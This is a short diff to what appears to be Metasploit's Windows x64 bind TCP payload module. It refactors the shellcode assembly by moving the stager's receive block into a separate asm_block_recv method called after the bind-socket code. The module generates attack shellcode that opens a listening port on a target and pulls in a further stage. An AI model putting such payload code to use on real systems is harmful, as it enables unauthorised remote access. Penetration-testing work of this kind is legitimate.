@@ -68,6 +68,7 @@ module Payload::Windows::BindTcp_x64
       start:
         pop rbp              ; pop off the address of 'api_call' for calling later.
       #{asm_bind_tcp(opts)}
+      #{asm_block_recv(opts)}
     ^
     Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
   end
@@ -204,6 +205,10 @@ module Payload::Windows::BindTcp_x64
     ^
 
     asm << asm_send_uuid if include_send_uuid
+    return asm
+  end
+
+  def asm_block_recv(opts={})
 
     asm << %Q^
       recv:
